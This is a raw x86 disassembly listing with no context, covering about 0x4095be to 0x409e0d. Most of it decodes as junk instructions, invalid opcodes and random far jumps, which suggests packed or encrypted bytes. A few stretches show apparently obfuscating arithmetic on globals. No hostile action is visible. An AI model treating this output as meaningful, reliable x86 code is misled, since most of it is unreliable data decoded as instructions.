  4095be:	push   esi
  4095bf:	jae    0x409544
  4095c1:	or     edi,esi
  4095c3:	sub    ah,BYTE PTR [ebx-0x2a]
  4095c6:	gs pushf 
  4095c8:	shl    DWORD PTR [esi+0x212df6ad],cl
  4095ce:	addr16 push ecx
  4095d0:	cmp    al,ah
  4095d2:	ds dec esi
  4095d4:	pop    esi
  4095d5:	xor    DWORD PTR [edi],0x6e
  4095d8:	or     edi,esi
  4095da:	ss pusha 
  4095dc:	inc    ebp
  4095dd:	aaa    
  4095de:	mov    bh,BYTE PTR [esi+0x79]
  4095e1:	(bad)  
  4095e2:	clc    
  4095e3:	mov    edx,0xc361de66
  4095e8:	aaa    
  4095e9:	sub    al,0x20
  4095ec:	aad    0xff
  4095ee:	(bad)  
  4095ef:	jmp    0x409836
  4095f4:	loope  0x40958c
  4095f6:	jmp    0x3d73:0xf1606904
  4095fd:	clc    
  4095fe:	jmp    0x8e76:0xd73d8b4e
  409605:	fstp   TBYTE PTR [esi+0x7e]
  409608:	and    al,0x7c
  40960a:	jle    0x40968a
  40960c:	in     eax,0xe6
  40960e:	rol    BYTE PTR [edx],0xbb
  409611:	pop    ebx
  409612:	sbb    eax,0xa79b76fd
  409617:	mov    esp,0x5db65e64
  40961c:	sti    
  40961d:	pop    ds
  40961e:	mov    es,edi
  409620:	sti    
  409621:	mov    eax,ds:0x5dd626a1
  409626:	inc    eax
  409627:	nop
  409628:	sbb    DWORD PTR [edi],ecx
  40962a:	jae    0x4095e3
  40962c:	ds jno 0x409655
  40962f:	imul   ebx,DWORD PTR [ebp+ebp*8-0x79],0xd091a37b
  409637:	inc    esp
  409638:	adc    edi,edx
  40963a:	ins    DWORD PTR es:[edi],dx
  40963b:	cdq    
  40963c:	jmp    FWORD PTR [esi]
  40963e:	rcl    bh,1
  409640:	push   ebp
  409641:	cmp    al,0x3b
  409643:	(bad)  
  409644:	and    cl,bh
  409646:	loopne 0x4096bd
  409648:	add    al,0x27
  40964a:	in     al,dx
  40964b:	retf   0xf7cb
  40964e:	cmp    BYTE PTR [edx],bl
  409650:	dec    edi
  409651:	fmulp  st(2),st
  409653:	(bad)  
  409654:	mov    al,ds:0x880e1915
  409659:	jnp    0x409621
  40965b:	add    DWORD PTR [ecx-0x4c],ebx
  40965e:	arpl   WORD PTR [ebp-0x3d1e48e0],bx
  409664:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409665:	ja     0x40964d
  409667:	in     eax,dx
  409668:	sbb    eax,0x60719041
  40966d:	mov    ds:0xd04c61e,eax
  409672:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409673:	cmp    eax,0xb256ff7a
  409678:	mov    edx,0x16d50313
  40967d:	and    cl,BYTE PTR [edi+0x16]
  409680:	ins    DWORD PTR es:[edi],dx
  409681:	add    al,0x1e
  409683:	xor    DWORD PTR [ebp-0x2e],eax
  409686:	repz (bad) 
  409688:	mov    eax,ds:0x3a679460
  40968d:	out    0xc6,al
  40968f:	icebp  
  409690:	sbb    al,0x64
  409692:	mov    bl,0x91
  409694:	rcr    DWORD PTR [edi+0x23],1
  409697:	test   al,0xc8
  409699:	call   0xebcc:0x5c78cf00
  4096a0:	push   esp
  4096a1:	or     al,0xa5
  4096a3:	inc    edx
  4096a4:	sbb    DWORD PTR [ebx-0x36debd1a],ebx
  4096aa:	jb     0x409683
  4096ac:	aad    0x93
  4096ae:	bound  ecx,QWORD PTR [ebx-0x723b2612]
  4096b4:	xchg   ebp,eax
  4096b5:	adc    al,0x9b
  4096b7:	test   eax,0xbe41434b
  4096bc:	mov    eax,0xc0ee07a4
  4096c1:	jmp    0xc6f5:0x5b47d3cf
  4096c8:	cmc    
  4096c9:	ss fs cld 
  4096cc:	push   0xffffff99
  4096ce:	into   
  4096cf:	fs mov ah,0x5c
  4096d2:	and    esp,ebx
  4096d4:	xchg   ebx,eax
  4096d5:	std    
  4096d6:	ret    
  4096d7:	inc    edx
  4096d8:	jg     0x4096cc
  4096da:	mov    cl,0x54
  4096dc:	int3   
  4096dd:	enter  0x8bab,0x98
  4096e1:	stos   DWORD PTR es:[edi],eax
  4096e2:	push   ecx
  4096e3:	cmp    DWORD PTR [eax],eax
  4096e5:	mov    eax,ds:0xe6b14d21
  4096ea:	call   0x383d197a
  4096ef:	stc    
  4096f0:	xlat   BYTE PTR ds:[ebx]
  4096f1:	push   ss
  4096f2:	test   eax,0x9e1772bc
  4096f7:	sub    DWORD PTR [edx+0x4f042716],0x73
  4096fe:	push   ebx
  4096ff:	out    dx,al
  409700:	shr    dl,1
  409702:	cmp    BYTE PTR [edx+esi*8],ch
  409705:	sti    
  409706:	call   0x7688:0x887054b2
  40970d:	outs   dx,DWORD PTR ds:[esi]
  40970e:	out    dx,eax
  40970f:	xor    DWORD PTR [ebp+0x662e4f75],ecx
  409715:	loope  0x409713
  409717:	retf   0x8e0c
  40971a:	add    BYTE PTR [esi+esi*1-0x77],dh
  40971e:	xlat   BYTE PTR ds:[ebx]
  40971f:	imul   edi,DWORD PTR [edi],0x408cc6b
  409725:	pop    edi
  409726:	and    ecx,ecx
  409728:	or     eax,0x4f88a166
  40972d:	test   BYTE PTR [ebx],dl
  40972f:	or     DWORD PTR [ebx+ebp*1-0x4debcf66],ebp
  409736:	xor    eax,0x62f7392e
  40973b:	(bad)  
  40973c:	hlt    
  40973d:	mov    al,ds:0x872989cb
  409742:	mov    al,0xa5
  409744:	aad    0xf8
  409746:	mov    cl,0xea
  409748:	hlt    
  409749:	loope  0x4096ee
  40974b:	mov    bl,0x71
  40974d:	jmp    0x8b2ba677
  409752:	ins    DWORD PTR es:[edi],dx
  409753:	in     al,dx
  409754:	ins    BYTE PTR es:[edi],dx
  409755:	in     eax,0x41
  409757:	inc    eax
  409758:	or     esp,DWORD PTR [esi+0x3d]
  40975b:	jmp    0x68b3546a
  409760:	jge    0x409730
  409762:	jmp    0x33834118
  409767:	dec    edi
  409768:	mov    ah,0xf9
  40976a:	xor    BYTE PTR ds:0xe8293c03,cl
  409770:	xchg   esp,eax
  409771:	jns    0x4097eb
  409773:	sbb    cl,BYTE PTR [esi]
  409775:	mov    cl,0xf7
  409777:	aad    0x5e
  409779:	neg    DWORD PTR [ebx]
  40977b:	cli    
  40977c:	xchg   ebp,eax
  40977d:	in     al,0x91
  40977f:	push   edx
  409780:	jle    0x409734
  409782:	mov    ebx,0x4fed4315
  409787:	int    0x27
  409789:	pop    ebp
  40978a:	xor    BYTE PTR [esi+0x1112c4fd],dl
  409790:	fdiv   st,st(4)
  409792:	push   ds
  409793:	fld    TBYTE PTR [eax-0xd]
  409796:	mov    ebx,0x1078dcec
  40979b:	fimul  DWORD PTR [ebp+0xe]
  40979e:	push   es
  40979f:	mov    dl,0xad
  4097a1:	fbstp  TBYTE PTR [ebx+0x54]
  4097a4:	sti    
  4097a5:	jg     0x40976c
  4097a7:	xor    al,0x17
  4097a9:	fstp   TBYTE PTR [eax]
  4097ab:	mov    ecx,0xca6e4a57
  4097b0:	xor    ebp,DWORD PTR [ebp+0x4ca741cc]
  4097b6:	pop    ebx
  4097b7:	push   es
  4097b8:	scas   eax,DWORD PTR es:[edi]
  4097b9:	out    dx,eax
  4097ba:	in     eax,0x8
  4097bc:	mov    al,0xbe
  4097be:	xlat   BYTE PTR ds:[ebx]
  4097bf:	and    cl,dh
  4097c1:	push   cs
  4097c2:	mov    al,ds:0xcd6073b
  4097c7:	mov    dh,0xc
  4097c9:	push   0x86e17c73
  4097ce:	rcr    ebx,cl
  4097d0:	inc    ecx
  4097d1:	popf   
  4097d2:	pop    ebx
  4097d3:	mov    ds:0x32d39b4d,al
  4097d8:	fdiv   QWORD PTR [edx-0x18]
  4097db:	xchg   BYTE PTR [eax-0x1c],dl
  4097de:	fbstp  TBYTE PTR [eax]
  4097e0:	retf   0x847a
  4097e3:	fdivrp st(7),st
  4097e5:	pushf  
  4097e6:	jg     0x40976e
  4097e8:	mov    ch,0x9d
  4097ea:	xor    edi,DWORD PTR [ebx+0x24]
  4097ed:	fs mov esp,0xb86a4c3f
  4097f3:	push   ebx
  4097f4:	xchg   BYTE PTR [edi-0x1eadaa31],bl
  4097fa:	fucom  st(7)
  4097fc:	mov    ebp,0xeb2f69d9
  409801:	push   esp
  409802:	fisttp QWORD PTR [ebx+0xf28c3c5]
  409808:	jg     0x4097d4
  40980a:	(bad)  [ebp-0x3]
  40980d:	xor    edi,DWORD PTR [ebp+edx*2-0x4a]
  409811:	ror    BYTE PTR [edi+ebp*1],1
  409814:	shl    BYTE PTR [ebx+ecx*2-0x7d55992d],1
  40981b:	pop    esp
  40981c:	popf   
  40981d:	pop    esi
  40981e:	add    DWORD PTR [eax+edi*2+0x60e205f9],edi
  409825:	xor    edx,0x40
  409828:	leave  
  409829:	inc    ecx
  40982a:	je     0x409822
  40982c:	mov    ebx,0x32da98b5
  409831:	stos   BYTE PTR es:[edi],al
  409832:	addr16 (bad) 
  409834:	mov    eax,ds:0xf4458ba2
  409839:	cmp    eax,ebx
  40983b:	je     0x40892f
  409841:	mov    eax,DWORD PTR [ebp-0x8]
  409844:	mov    eax,DWORD PTR [eax]
  409846:	pop    edi
  409847:	pop    esi
  409848:	pop    ebx
  409849:	leave  
  40984a:	ret    0xc
  40984d:	push   ebp
  40984e:	mov    ebp,esp
  409850:	sub    esp,0x30
  409853:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40985a:	add    ecx,0x13ba
  409860:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  409867:	xor    ecx,ecx
  409869:	xor    ecx,DWORD PTR ds:0x4336df
  40986f:	xor    DWORD PTR ds:0x433617,ecx
  409875:	mov    ecx,DWORD PTR [ebp-0x4]
  409878:	push   ebx
  409879:	sub    eax,eax
  40987b:	mov    eax,0x7510854
  409880:	add    DWORD PTR ds:0x4336db,0x4336ab
  40988a:	xor    ecx,eax
  40988c:	mov    ebx,0x32729b
  409891:	add    ecx,ebx
  409893:	or     DWORD PTR ds:0x433667,0x433713
  40989d:	mov    DWORD PTR [ebp-0x1c],ecx
  4098a0:	mov    ecx,DWORD PTR ds:0x4335fb
  4098a6:	sub    DWORD PTR ds:0x4336df,ecx
  4098ac:	mov    ecx,DWORD PTR [ebp+0x14]
  4098af:	jmp    0x409b12
  4098b4:	shr    DWORD PTR [ebx+0x7570c4c2],0xc1
  4098bb:	stos   DWORD PTR es:[edi],eax
  4098bc:	fadd   st(6),st
  4098be:	cwde   
  4098bf:	pushf  
  4098c0:	out    dx,al
  4098c1:	cld    
  4098c2:	push   cs
  4098c3:	pop    ds
  4098c4:	mov    ah,0xd9
  4098c6:	jle    0x409946
  4098c8:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  4098cc:	aaa    
  4098cd:	mov    esi,0x7d7248a0
  4098d2:	(bad)  
  4098d3:	daa    
  4098d4:	aad    0x35
  4098d6:	cdq    
  4098d7:	repz add esi,DWORD PTR [edx+0x35]
  4098db:	pop    ebx
  4098dc:	out    0xe,al
  4098de:	std    
  4098df:	and    DWORD PTR [edi+ebp*1+0x691b9775],eax
  4098e6:	add    edx,DWORD PTR [ecx-0x440b186c]
  4098ec:	mov    esp,0x6cf73221
  4098f1:	fsubr  QWORD PTR [ecx+0x41]
  4098f4:	sar    cl,0xcb
  4098f7:	dec    esi
  4098f8:	push   ecx
  4098f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098fa:	ds xor al,0x85
  4098fd:	shl    BYTE PTR [eax+0x46fb9daf],0x3c
  409904:	mov    eax,0xbf8d5953
  409909:	dec    eax
  40990a:	sahf   
  40990b:	mov    ebp,0xfe144d4d
  409910:	mov    eax,0xaa858691
  409915:	jo     0x4098cc
  409917:	xor    edi,DWORD PTR [ecx+0x60]
  40991a:	out    0x92,eax
  40991c:	cmp    BYTE PTR [esi+ebx*8],bl
  40991f:	es fmulp st(3),st
  409922:	mov    bl,0x95
  409924:	sbb    edi,ebp
  409926:	xchg   esp,eax
  409927:	mov    edi,DWORD PTR [edi-0x56]
  40992a:	mov    bl,0x28
  40992c:	daa    
  40992d:	gs adc eax,0x73769ea1
  409933:	sbb    al,0xff
  409935:	(bad)  
  409936:	adc    al,0x8
  409938:	sub    BYTE PTR [ebx+ecx*8-0x12d32c76],al
  40993f:	sub    eax,0xac70a6b0
  409944:	mov    bh,0x5f
  409946:	cmp    ebp,DWORD PTR ds:0x44d255b1
  40994c:	lods   eax,DWORD PTR ds:[esi]
  40994d:	push   ebp
  40994e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40994f:	xchg   BYTE PTR ds:0x200b079b,bl
  409955:	inc    edi
  409956:	mov    ebp,0xb1d71c2
  40995b:	pusha  
  40995c:	xor    al,0x62
  40995e:	sub    BYTE PTR [esi],ah
  409960:	fadd   QWORD PTR [ebx-0x1f]
  409963:	sub    al,0x52
  409965:	aad    0x33
  409967:	call   0xa9a7:0xd6ad0ccf
  40996e:	jbe    0x4099e8
  409970:	push   0xeb3119e8
  409975:	inc    eax
  409976:	push   cs
  409977:	inc    eax
  409978:	iret   
  409979:	test   al,0xb8
  40997b:	rol    BYTE PTR [ebp+ecx*2-0x4d518f06],cl
  409982:	fiadd  WORD PTR [ecx]
  409984:	arpl   WORD PTR [ecx+0x3a],bx
  409987:	xor    eax,0xe6ed4d59
  40998c:	jns    0x409947
  40998e:	retf   
  40998f:	retf   0x16a2
  409992:	sub    esp,DWORD PTR [esi+0x29]
  409995:	mov    ebp,0xced02f77
  40999a:	and    eax,0x80aa544f
  40999f:	pop    edx
  4099a0:	inc    eax
  4099a1:	int    0x1f
  4099a3:	mov    BYTE PTR [edi-0x9093de2],dl
  4099a9:	and    eax,0xe478e843
  4099ae:	sbb    al,0xb2
  4099b1:	jmp    0xa096d39a
  4099b6:	xor    BYTE PTR ss:[esi+0x1f3ce635],dl
  4099bd:	or     edx,edi
  4099bf:	mov    eax,0x5c345911
  4099c4:	jbe    0x409a06
  4099c6:	jae    0x40994d
  4099c8:	mov    ah,0x5d
  4099ca:	mov    gs:0xd3b18b4c,al
  4099d0:	or     ah,BYTE PTR ds:0x51c59be9
  4099d6:	and    dl,dh
  4099d8:	dec    edx
  4099d9:	repz pop es
  4099db:	fstp   QWORD PTR [esi-0x9]
  4099de:	scas   al,BYTE PTR es:[edi]
  4099df:	(bad)  
  4099e0:	sub    al,0x80
  4099e2:	sbb    eax,0x6c9f0265
  4099e7:	sub    al,0x61
  4099e9:	(bad)  
  4099ea:	xchg   edi,eax
  4099eb:	and    ebx,DWORD PTR [ecx]
  4099ed:	jge    0x4099df
  4099ef:	jmp    0xaafa390f
  4099f4:	mov    ch,0x46
  4099f6:	adc    BYTE PTR [ecx],bh
  4099f8:	mov    ds:0x84567824,eax
  4099fd:	inc    esp
  4099fe:	js     0x409a61
  409a00:	mov    ebx,0x13c022bd
  409a05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a06:	xor    eax,0x38502247
  409a0b:	js     0x4099fb
  409a0d:	mov    eax,ds:0xa6669454
  409a12:	sbb    eax,ecx
  409a14:	sbb    esi,edi
  409a16:	or     dh,BYTE PTR [ebx-0x78]
  409a19:	ins    DWORD PTR es:[edi],dx
  409a1a:	int    0xfb
  409a1c:	aas    
  409a1d:	xor    BYTE PTR [edx-0x7fec277a],al
  409a23:	mov    bh,0x25
  409a25:	mov    ecx,ebp
  409a27:	out    dx,al
  409a28:	jno    0x409a78
  409a2a:	in     eax,dx
  409a2b:	outs   dx,DWORD PTR ds:[esi]
  409a2c:	test   BYTE PTR [eax-0x33978f2d],ch
  409a32:	and    esi,ebx
  409a34:	mov    edx,0x2a8a8ccd
  409a39:	mov    DWORD PTR [esi+eiz*8],ebx
  409a3c:	fidivr DWORD PTR [edx]
  409a3e:	lea    edx,[ebx+0x7e]
  409a41:	mov    edi,0x339c5335
  409a46:	fwait
  409a47:	call   0xce0f:0xf9d8e87e
  409a4e:	xor    al,al
  409a50:	push   esp
  409a51:	or     ah,bl
  409a53:	aas    
  409a54:	mov    eax,ds:0xbebd879f
  409a59:	or     eax,0x8d76d1e1
  409a5e:	and    DWORD PTR [ebp+0x6ffba6c3],edi
  409a64:	or     BYTE PTR [edx],bh
  409a66:	js     0x409ae3
  409a68:	stos   BYTE PTR es:[edi],al
  409a69:	jge    0x409a4d
  409a6b:	test   BYTE PTR [esi-0x6c],bh
  409a6e:	push   eax
  409a6f:	out    0x97,eax
  409a71:	pushf  
  409a72:	or     BYTE PTR [eax+0x7637ebf6],dh
  409a78:	xlat   BYTE PTR ds:[ebx]
  409a79:	jge    0x409aba
  409a7b:	pushf  
  409a7c:	adc    BYTE PTR [eax+0x4],al
  409a7f:	jb     0x409aa9
  409a81:	sbb    DWORD PTR [edi-0xa164372],esp
  409a87:	pop    es
  409a88:	xor    dl,bh
  409a8a:	jmp    0xa34f187d
  409a8f:	push   edi
  409a90:	inc    eax
  409a91:	jle    0x409af3
  409a93:	mov    bl,dh
  409a95:	pop    edx
  409a96:	mov    al,ds:0x427ab0b5
  409a9b:	retf   0x5160
  409a9e:	clc    
  409a9f:	stos   DWORD PTR es:[edi],eax
  409aa0:	das    
  409aa1:	pop    ebx
  409aa2:	pop    DWORD PTR [ebp-0x7f]
  409aa5:	or     ebp,DWORD PTR [edi]
  409aa7:	xor    DWORD PTR [ecx-0x73eeb012],edi
  409aad:	call   0x7e172ce5
  409ab2:	out    0xb0,al
  409ab4:	jns    0x409a7a
  409ab6:	push   es
  409ab7:	das    
  409ab8:	daa    
  409ab9:	mov    al,ds:0x6c93cd72
  409abe:	(bad)  
  409abf:	xor    BYTE PTR [eax+edx*8-0x1aec4377],cl
  409ac6:	and    eax,0x252d00ed
  409acb:	out    0xcb,al
  409acd:	cmp    DWORD PTR [esi],esi
  409acf:	mov    edx,0x6ceae052
  409ad4:	xchg   DWORD PTR [eax],edx
  409ad6:	std    
  409ad7:	imul   ecx,DWORD PTR [edx],0x35beeb00
  409add:	sub    BYTE PTR es:[ecx+0x62],dh
  409ae1:	jns    0x409ab0
  409ae3:	bound  edi,QWORD PTR [ebx+0x19]
  409ae6:	cmc    
  409ae7:	adc    al,0xfb
  409ae9:	push   ds
  409aea:	dec    esp
  409aeb:	jns    0x409ab2
  409aed:	sbb    BYTE PTR [edx+0x6aaeddcd],cl
  409af3:	jns    0x409afb
  409af5:	(bad)  
  409af6:	jmp    0x2705572
  409afb:	icebp  
  409afc:	xor    DWORD PTR [ebx],edx
  409afe:	jmp    0x409b67
  409b00:	mul    DWORD PTR [edx+0x5f]
  409b03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b04:	dec    edx
  409b05:	int3   
  409b06:	mov    ch,0x25
  409b08:	push   esi
  409b09:	sub    al,0xf1
  409b0b:	pop    esi
  409b0c:	(bad)  
  409b0d:	mov    eax,ds:0x997b6169
  409b12:	push   esi
  409b13:	push   edi
  409b14:	sbb    DWORD PTR ds:0x43369f,0x433653
  409b1e:	jmp    0x409d81
  409b23:	lds    esp,FWORD PTR [edi-0x2e932d54]
  409b29:	popa   
  409b2a:	mov    cl,0x92
  409b2c:	fisttp QWORD PTR [edi+0x693a96d4]
  409b32:	in     al,0x7e
  409b34:	in     al,0x7e
  409b36:	jle    0x409b70
  409b38:	jl     0x409bb8
  409b3a:	jle    0x409ace
  409b3c:	pop    ds
  409b3d:	fs icebp 
  409b3f:	cmp    dl,BYTE PTR [edi+0xcaa4bc4]
  409b45:	out    dx,al
  409b46:	loope  0x409b1f
  409b48:	fnstsw WORD PTR [ebx+ebx*1+0x2a6afd33]
  409b4f:	popf   
  409b50:	dec    esp
  409b51:	xor    ebx,DWORD PTR [ebp+0x10557d58]
  409b57:	mov    edx,0x32bac97f
  409b5c:	or     dl,0x17
  409b5f:	push   edi
  409b60:	dec    edi
  409b61:	dec    edx
  409b62:	aad    0xed
  409b64:	in     eax,dx
  409b65:	mov    esp,0x7759ed39
  409b6a:	push   ebp
  409b6b:	adc    al,0x35
  409b6d:	mov    bh,0x16
  409b6f:	add    bh,BYTE PTR [eax-0x7ea8f25e]
  409b75:	jmp    FWORD PTR [edx-0x24d2906f]
  409b7b:	dec    edi
  409b7c:	gs aam 0xfb
  409b7f:	dec    ecx
  409b80:	lods   eax,DWORD PTR ds:[esi]
  409b81:	push   eax
  409b82:	jb     0x409b12
  409b84:	(bad)  
  409b85:	mov    ds:0x8883095a,eax
  409b8a:	pop    edx
  409b8b:	xchg   esp,eax
  409b8c:	fisubr WORD PTR [ebx+0x5594cc1b]
  409b92:	and    dl,BYTE PTR [ecx-0x63d5e465]
  409b98:	pop    ebp
  409b99:	pop    eax
  409b9a:	mov    esi,0x5bcfe868
  409b9f:	mov    eax,0xd355a467
  409ba4:	ret    
  409ba5:	lock mov ebx,0x91d1d5e9
  409bab:	fadd   DWORD PTR [ecx+0x10]
  409bae:	cmp    eax,0xf8243abe
  409bb3:	and    al,0x85
  409bb5:	push   ebx
  409bb6:	out    dx,eax
  409bb7:	push   ebp
  409bb8:	dec    esi
  409bb9:	out    dx,eax
  409bba:	ja     0x409bcd
  409bbc:	jnp    0x409b4d
  409bbe:	lods   al,BYTE PTR ds:[esi]
  409bbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409bc0:	push   edx
  409bc1:	shl    BYTE PTR [ecx+0x339153f7],cl
  409bc7:	xor    dl,bl
  409bc9:	shl    DWORD PTR [edx],0xe
  409bcc:	inc    ebp
  409bcd:	shr    DWORD PTR [ebx-0x447737b3],cl
  409bd3:	mov    al,ds:0x5323725c
  409bd8:	cmp    al,0x12
  409bda:	push   0xffffffa9
  409bdc:	inc    esi
  409bdd:	push   cs
  409bde:	das    
  409bdf:	loop   0x409be2
  409be1:	mov    dl,BYTE PTR [ebp+0x26]
  409be4:	daa    
  409be5:	pushf  
  409be6:	or     bl,0x33
  409be9:	call   0x74221731
  409bee:	int    0xfc
  409bf0:	ds jo  0x409c06
  409bf3:	popf   
  409bf4:	mov    dh,0xdd
  409bf6:	shl    BYTE PTR [ebp-0x7f],0x18
  409bfa:	ins    BYTE PTR es:[edi],dx
  409bfb:	push   ecx
  409bfc:	pop    edx
  409bfd:	mov    ch,0x76
  409bff:	cwde   
  409c00:	push   ecx
  409c01:	and    DWORD PTR [eax],0x13dd83e5
  409c07:	and    BYTE PTR [ecx+0x26],ch
  409c0a:	stc    
  409c0b:	xchg   ebp,eax
  409c0c:	js     0x409bb3
  409c0e:	mov    ecx,0x86c8e3db
  409c13:	cmp    eax,0x927b46e5
  409c18:	xchg   edi,eax
  409c19:	jb     0x409c63
  409c1b:	enter  0xbe39,0xce
  409c1f:	adc    ecx,ecx
  409c21:	jmp    0x6647:0x4c227978
  409c28:	sub    BYTE PTR [edi-0x1e],0xb2
  409c2c:	add    ebx,DWORD PTR [edx]
  409c2e:	popf   
  409c2f:	push   0x1b
  409c31:	mov    al,0xe0
  409c33:	aas    
  409c34:	ss pop eax
  409c36:	jecxz  0x409c8f
  409c38:	data16 int3 
  409c3a:	das    
  409c3b:	fnstenv [esi+0x6a]
  409c3e:	int    0xd1
  409c40:	lods   eax,DWORD PTR ds:[esi]
  409c41:	int    0x75
  409c43:	test   ah,dl
  409c45:	xlat   BYTE PTR ds:[ebx]
  409c46:	sti    
  409c47:	jle    0x409c06
  409c49:	mov    ds:0x27d8df9f,eax
  409c4e:	cs scas eax,DWORD PTR es:[edi]
  409c50:	add    al,0x3a
  409c52:	or     BYTE PTR [ebx],bh
  409c54:	mov    edi,0x187c1613
  409c59:	pop    ecx
  409c5a:	mov    ?,edi
  409c5c:	iret   
  409c5d:	bound  ebp,QWORD PTR [eax-0x56]
  409c60:	add    esp,DWORD PTR [esi]
  409c62:	scas   eax,DWORD PTR es:[edi]
  409c63:	rcr    BYTE PTR [edi-0x6c12d258],cl
  409c69:	sbb    DWORD PTR [ebx],eax
  409c6b:	mov    esp,0xdff2f7cb
  409c70:	jl     0x409c74
  409c72:	cmp    BYTE PTR [esi+0x21],bl
  409c75:	je     0x409c38
  409c77:	ss cwde 
  409c79:	sub    DWORD PTR [edx-0x4a2c4610],ebp
  409c7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c80:	loope  0x409c07
  409c82:	xor    al,0x7a
  409c84:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  409c86:	add    ebp,eax
  409c88:	cmp    al,0x61
  409c8a:	arpl   WORD PTR [eax-0x2bfacb9d],bx
  409c90:	add    DWORD PTR [ebx],0x74ad20c5
  409c96:	in     al,0xbe
  409c98:	ins    BYTE PTR es:[edi],dx
  409c99:	out    0xf6,al
  409c9b:	cs jmp 0x409ce9
  409c9e:	mov    esp,0x2ed4354c
  409ca3:	inc    esi
  409ca4:	push   ds
  409ca5:	mov    eax,0x280cddd0
  409caa:	pop    ecx
  409cab:	sub    bh,BYTE PTR [ebx+0x5005de5b]
  409cb1:	mov    ebp,0xc2d716de
  409cb6:	fadd   st,st(2)
  409cb8:	add    dl,BYTE PTR [ecx]
  409cba:	push   edi
  409cbb:	adc    eax,0x181ab6c6
  409cc0:	inc    edx
  409cc1:	sub    BYTE PTR [eax+0x5a],cl
  409cc4:	jmp    0x409d2b
  409cc6:	daa    
  409cc7:	sub    BYTE PTR [ebx+0x4cf72ca6],cl
  409ccd:	(bad)  
  409cce:	jb     0x409cca
  409cd0:	retf   0x6ff3
  409cd3:	xor    ebx,DWORD PTR [eax-0x65]
  409cd6:	dec    edx
  409cd7:	jmp    0x7c89:0x910a26ae
  409cde:	ja     0x409ce2
  409ce0:	jle    0x409d2b
  409ce2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ce3:	or     al,0x4e
  409ce5:	sbb    ax,0x367
  409ce9:	xor    BYTE PTR [ebx+0x46],al
  409cec:	sbb    al,0xd4
  409cee:	leave  
  409cef:	(bad)  
  409cf0:	cmc    
  409cf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409cf2:	adc    edx,esp
  409cf4:	inc    ebp
  409cf5:	pop    edi
  409cf6:	mov    ecx,0x5ceed9bb
  409cfb:	xor    dl,BYTE PTR [ecx+0x332d7caa]
  409d01:	dec    ecx
  409d02:	cld    
  409d03:	mov    ecx,0x8d8dc5b7
  409d08:	push   cs
  409d09:	and    BYTE PTR [edi],0x26
  409d0c:	and    eax,0x66fd45b8
  409d11:	popa   
  409d12:	or     DWORD PTR [ebp+0x375527d6],edx
  409d18:	mov    cl,0xe0
  409d1a:	push   edx
  409d1b:	cmp    cl,0xc1
  409d1e:	pop    DWORD PTR [esi-0x79]
  409d21:	push   ss
  409d22:	and    eax,0xfe520692
  409d27:	inc    esi
  409d28:	and    ch,al
  409d2a:	xor    bl,BYTE PTR [edi+0x7de851b2]
  409d30:	and    ebx,esi
  409d32:	or     BYTE PTR [esi-0x2f],dl
  409d35:	jb     0x409d57
  409d37:	pusha  
  409d38:	je     0x409d4a
  409d3a:	dec    esp
  409d3b:	sbb    esi,eax
  409d3d:	xor    bl,bh
  409d3f:	and    DWORD PTR ds:0x5097ec8a,esp
  409d45:	mov    ds:0x6ed0db76,eax
  409d4a:	dec    edx
  409d4b:	ins    DWORD PTR es:[edi],dx
  409d4c:	xchg   DWORD PTR [ebx-0x76c97291],eax
  409d52:	neg    DWORD PTR [edi-0x3f1806f0]
  409d58:	dec    ebx
  409d59:	push   ds
  409d5a:	fild   WORD PTR [ebx]
  409d5c:	push   es
  409d5d:	mov    esp,0x1fb72978
  409d62:	clc    
  409d63:	ret    
  409d64:	fst    DWORD PTR [ebx-0x5b844876]
  409d6a:	ja     0x409d74
  409d6c:	jp     0x409d83
  409d6e:	jb     0x409de1
  409d70:	inc    eax
  409d71:	inc    esi
  409d72:	cmp    eax,0x16faa472
  409d77:	pop    ebx
  409d78:	mov    esp,0x47e5df90
  409d7d:	adc    BYTE PTR [edi],cl
  409d7f:	mov    edi,0xc7c985c4
  409d84:	add    eax,0x433617
  409d89:	out    0x34,eax
  409d8b:	add    BYTE PTR [eax],al
  409d8d:	je     0x409da7
  409d93:	mov    ecx,DWORD PTR [ebp+0x14]
  409d96:	mov    edi,DWORD PTR ds:0x43360b
  409d9c:	sub    DWORD PTR ds:0x4336df,edi
  409da2:	mov    ecx,DWORD PTR [ecx]
  409da4:	mov    DWORD PTR [ebp-0x1c],ecx
  409da7:	or     DWORD PTR ds:0x433653,ebx
  409dad:	jmp    0x40a010
  409db2:	push   eax
  409db3:	call   FWORD PTR [esi+0x50697168]
  409db9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dba:	or     al,0x5f
  409dbc:	inc    edi
  409dbd:	pop    es
  409dbe:	push   ds
  409dbf:	mov    esi,0xe238c695
  409dc4:	jle    0x409e44
  409dc6:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  409dca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dcb:	fist   WORD PTR [ebx+0x71]
  409dce:	jecxz  0x409e32
  409dd0:	leave  
  409dd1:	mov    esi,esi
  409dd3:	push   0xd42f339d
  409dd8:	add    eax,0x5168c243
  409ddd:	push   esp
  409dde:	sbb    eax,0xfe0c59eb
  409de3:	adc    DWORD PTR ds:0xfc1e77d1,0x32da81e
  409ded:	xchg   edi,eax
  409dee:	mov    ch,0xf4
  409df0:	mov    eax,DWORD PTR [esp+ebp*8+0x6fdab4fb]
  409df7:	mov    cl,0xac
  409df9:	inc    esp
  409dfa:	push   ebx
  409dfb:	lods   eax,DWORD PTR ds:[esi]
  409dfc:	adc    BYTE PTR [esp+ebp*1-0x1f65b2ad],bh
  409e03:	push   esi
  409e04:	loopne 0x409de8
  409e06:	imul   edi,DWORD PTR [eax+0x741888af],0x3c
  409e0d:	jmp    0x409e72
